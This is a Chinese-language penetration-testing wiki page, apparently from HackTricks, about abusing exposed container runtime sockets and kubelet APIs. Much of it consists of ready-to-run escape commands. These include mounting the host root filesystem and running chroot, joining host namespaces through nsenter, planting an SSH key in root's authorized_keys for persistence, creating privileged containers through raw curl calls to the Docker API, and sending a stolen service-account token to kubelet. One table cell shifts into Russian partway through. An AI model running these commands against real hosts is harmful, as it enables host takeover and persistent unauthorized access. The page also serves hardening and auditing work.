# Runtime API 与 Daemon 暴露

{{#include ../../../banners/hacktricks-training.md}}

## 概述

许多真实的 container compromise 根本不是从 namespace escape 开始的，而是从访问 runtime control plane 开始的。如果 workload 能够通过挂载的 Unix socket 或暴露的 TCP listener 与 `dockerd`、`containerd`、CRI-O、Podman 或 kubelet 通信，攻击者就可能请求创建一个具有更高权限的新 container、挂载 host filesystem、加入 host namespaces，或获取敏感的 node 信息。在这些情况下，runtime API 才是真正的 security boundary，而 compromise 它在实际效果上几乎等同于 compromise host。

因此，应当将 runtime socket exposure 与 kernel protections 分开记录。即使 container 具备常规的 seccomp、capabilities 和 MAC confinement，只要 `/var/run/docker.sock` 或 `/run/containerd/containerd.sock` 被挂载到其中，它仍可能只需一次 API call 就 compromise host。当前 container 的 kernel isolation 可能完全按照设计正常工作，但 runtime management plane 仍然完全暴露。

## Daemon 访问模型

Docker Engine 传统上通过本地 Unix socket `unix:///var/run/docker.sock` 暴露其 privileged API。历史上，它也曾通过 `tcp://0.0.0.0:2375` 等 TCP listener，或通过受 TLS 保护的 `2376` listener 进行远程暴露。在没有强 TLS 和 client authentication 的情况下远程暴露 daemon，实际上会将 Docker API 变成一个 remote root interface。

containerd、CRI-O、Podman 和 kubelet 也暴露类似的 high-impact attack surface。它们的名称和工作流有所不同，但逻辑并无差异。如果该 interface 允许调用方创建 workloads、挂载 host paths、获取 credentials 或修改正在运行的 containers，那么它就是一个 privileged management channel，应按此进行处理。

常见的值得检查的本地路径包括：
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
较旧或更专业化的 stacks 还可能暴露 `dockershim.sock`、`frakti.sock` 或 `rktlet.sock` 等 endpoints。这些在现代环境中并不常见，但一旦发现，应采取同样的谨慎态度，因为它们代表的是 runtime-control surfaces，而不是普通的 application sockets。

## Secure Remote Access

如果 daemon 必须暴露到本地 socket 之外，则应使用 TLS 保护连接，并最好采用 mutual authentication，以便 daemon 验证 client，同时 client 验证 daemon。为了方便而通过纯 HTTP 开放 Docker daemon 的旧习惯，是 container administration 中最危险的错误之一，因为其 API surface 足够直接创建 privileged containers。

历史上的 Docker 配置模式如下：
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
在基于 systemd 的主机上，daemon 通信也可能显示为 `fd://`，这意味着进程会从 systemd 继承一个预先打开的 socket，而不是自行直接绑定它。重要的经验并不在于确切的语法，而在于其安全影响。一旦 daemon 监听范围超出权限控制严格的本地 socket，传输安全和客户端身份验证就不再是可选的加固措施，而成为必需项。

## 滥用

如果存在 runtime socket，请确认它具体是哪一个、是否存在兼容的客户端，以及是否可以通过原始 HTTP 或 gRPC 访问：
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
这些命令很有用，因为它们可以区分路径失效、socket 已挂载但无法访问，以及可用的高权限 API。如果客户端执行成功，接下来的问题就是：该 API 是否可以通过 host bind mount 或共享 host namespace 启动新 container。

### 未安装客户端时

没有安装 `docker`、`podman` 或其他便捷 CLI，并不意味着 socket 是安全的。Docker Engine 通过其 Unix socket 使用 HTTP 通信，而 Podman 通过 `podman system service` 同时提供与 Docker 兼容的 API 和 Libpod 原生 API。这意味着，即使是只包含 `curl` 的最小化环境，也可能足以驱动该 daemon：
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
这在 post-exploitation 期间非常重要，因为防御人员有时会移除常用的客户端二进制文件，但保留已挂载的管理 socket。在 Podman 主机上，请记住，高价值路径会因 rootful 和 rootless 部署而有所不同：rootful 服务实例使用 `unix:///run/podman/podman.sock`，rootless 服务实例使用 `unix://$XDG_RUNTIME_DIR/podman/podman.sock`。

### 完整示例：Docker Socket 到 Host Root

如果可以访问 `docker.sock`，经典的逃逸方式是启动一个挂载主机根文件系统的新容器，然后对其执行 `chroot`：
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
这通过 Docker daemon 提供了直接以 host-root 执行的能力。其影响并不限于读取文件。进入新 container 后，攻击者可以修改主机文件、窃取 credentials、植入 persistence，或启动其他 privileged workloads。

### Full Example: Docker Socket To Host Namespaces

如果攻击者更倾向于进入 namespace，而不是仅访问文件系统：
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
这种路径不是通过利用当前容器，而是要求 runtime 创建一个具有明确 host namespace 暴露的新容器，从而到达 host。

### Docker Socket 持久化模式

Runtime 控制也可用于持久化，而不只是执行一次性 shell。通用模式是创建一个带有 host mount 的 helper container，将 authorized access material 或 startup hook 写入已挂载的 host 文件系统，然后验证 host 是否会使用它。

示例形态：
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
同样的思路也可以针对 systemd units、cron fragments、application startup files 或 SSH keys，具体取决于 operator 想要证明什么。重要的是，persistent change 是通过 runtime daemon 对 host-level filesystem 的 authority 完成的，而不是通过提升 original container 中的 privilege。

### Raw Docker API Helper Pivot

当 Docker CLI 不存在时，同样的 host-mount helper flow 可以通过 Unix socket 上的 HTTP 来驱动。通用流程是：确认 API，创建带有 host bind mount 的 helper container，启动它，创建一个 exec instance，然后启动该 exec。
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
最终的 `/exec/<id>/start` 请求依赖于返回的 exec ID，但安全要点与具体的 JSON plumbing 无关：对 rootful Docker daemon 的原始 API 访问，足以请求一个权限更强的 helper workload。

### 完整示例：containerd Socket

挂载的 `containerd` Socket 通常同样危险：
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
如果存在更类似 Docker 的客户端，`nerdctl` 可能比 `ctr` 更方便，因为它提供了熟悉的 flags，例如 `--privileged`、`--pid=host` 和 `-v`：
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
影响同样是主机失陷。即使不存在 Docker-specific tooling，另一个 runtime API 仍可能提供相同的管理权限。在 Kubernetes 节点上，`crictl` 也可能足以用于 reconnaissance 和 container interaction，因为它直接与 CRI endpoint 通信。

### BuildKit Socket

`buildkitd` 很容易被忽略，因为人们常常认为它“只是 build backend”，但该 daemon 仍然是一个 privileged control plane。可访问的 `buildkitd.sock` 可能允许攻击者运行任意 build steps、检查 worker capabilities、使用 compromised environment 中的 local contexts，并在 daemon 配置为允许这些权限时请求 `network.host` 或 `security.insecure` 等危险 entitlements。

有用的初始交互包括：
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
如果 daemon 接受构建请求，请测试是否可用不安全的 entitlements：
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
具体影响取决于 daemon 配置，但具有宽松 entitlements 的 rootful BuildKit service 绝不是无害的 developer convenience。应将其视为另一个高价值的 administrative surface，尤其是在 CI runners 和共享 build nodes 上。

### 通过 TCP 访问 Kubelet API

kubelet 并不是 container runtime，但它仍属于 node management plane 的一部分，并且通常处于同一 trust boundary 的讨论范围内。如果 workload 可以访问 kubelet secure port `10250`，或者 node credentials、kubeconfigs 或 proxy rights 暴露出来，攻击者可能无需接触 Kubernetes API server admission path，就能够枚举 Pods、获取 logs，或在 node-local containers 中执行 commands。

从低成本的 discovery 开始：
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
如果 kubelet 或 API-server proxy path 授权了 `exec`，支持 WebSocket 的客户端就可以将其转化为在节点上其他容器中执行代码的能力。这也是为什么仅具有 `get` 权限的 `nodes/proxy` 比听起来更加危险：请求仍然可以到达能够执行命令的 kubelet endpoints，而这些直接与 kubelet 的交互不会出现在正常的 Kubernetes audit logs 中。

## 检查

这些检查旨在确认容器是否能够访问任何本应位于 trust boundary 之外的管理平面。
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
这里有哪些值得关注的地方：

- 挂载的 runtime socket 通常是直接的管理权限原语，而不仅仅是信息泄露。
- 未启用 TLS 的 `2375` TCP listener 应被视为远程入侵条件。
- `DOCKER_HOST` 等环境变量通常表明该 workload 被有意设计为与主机 runtime 通信。

## Runtime 默认配置

| Runtime / platform | 默认状态 | 默认行为 | 常见的手动弱化方式 |
| --- | --- | --- | --- |
| Docker Engine | 默认使用本地 Unix socket | `dockerd` 监听本地 socket，且 daemon 通常以 root 权限运行 | 挂载 `/var/run/docker.sock`、暴露 `tcp://...:2375`、在 `2376` 上使用弱 TLS 或不使用 TLS |
| Podman | 默认使用无 daemon 的 CLI | 普通本地使用不需要长期运行的特权 daemon；启用 `podman system service` 后仍可能暴露 API socket | 暴露 `podman.sock`、广泛运行该 service、使用 rootful API |
| containerd | 本地特权 socket | 通过本地 socket 暴露管理 API，通常由更高层 tooling 使用 | 挂载 `containerd.sock`、授予广泛的 `ctr` 或 `nerdctl` 访问权限、暴露特权 namespace |
| CRI-O | 本地特权 socket | CRI endpoint предназначен для доверенных компонентов, работающих локально на узле | 挂载 `crio.sock`、将 CRI endpoint 暴露给不受信任的 workload |
| Kubernetes kubelet | 节点本地管理 API | Kubelet 不应被 Pod 广泛访问；根据 authn/authz 配置，访问权限可能暴露 Pod 状态、凭据和执行功能 | 挂载 kubelet socket 或证书、kubelet auth 配置薄弱、使用 host networking 并访问 kubelet endpoint |

## References

- [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
